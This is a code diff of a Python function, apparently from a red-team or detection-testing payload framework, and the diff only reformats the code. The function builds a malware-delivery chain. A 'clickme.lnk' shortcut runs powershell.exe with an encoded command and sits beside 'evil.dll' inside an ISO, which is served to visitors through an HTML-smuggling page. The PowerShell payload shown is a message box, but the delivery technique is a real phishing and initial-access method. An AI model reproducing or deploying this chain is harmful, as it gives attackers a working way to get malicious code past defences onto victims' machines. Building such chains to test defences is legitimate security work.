@@ -22,30 +22,24 @@ def recipe1(baseUrl) -> List[AceRoute]:
     dllData: AceBytes = readFileContent('payloads/evil.dll')
     dllFile: AceFile = makeAceFile('evil.dll', dllData)
 
-    psMsgbox: AceStr = makePsScriptMessagebox()
     # LNK to powershell.exe to execute DLL
-    execData: AceStr = makePsEncodedCommand(
-        input=psMsgbox,
-    )
+    psMsgbox: AceStr = makePsScriptMessagebox()
+    psData: AceStr = makePsEncodedCommand(input=psMsgbox)
     lnkData: AceBytes = makeLnk(
         name = "clickme.lnk",
         target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        arguments = "-EncodedCommand {}".format(execData),
+        arguments = "-EncodedCommand {}".format(psData),
     )
     lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)
 
     # Pack DLL and LNK into ISO
-    container: AceBytes = makeIso(
-        files = [
-            dllFile,
-            lnkFile,
-        ],
-    )
+    container: AceBytes = makeIso(files = [
+        dllFile,
+        lnkFile,
+    ])
     containerFile: AceFile = makeAceFile('test.iso', container)
 
     # HTML to serve ISO
-    html: AceStr = makeHtmlSmuggling(
-        containerFile,
-    )
+    html: AceStr = makeHtmlSmuggling(containerFile)
     serveHtml: AceRoute = AceRoute('/test', html)
     return([serveHtml])
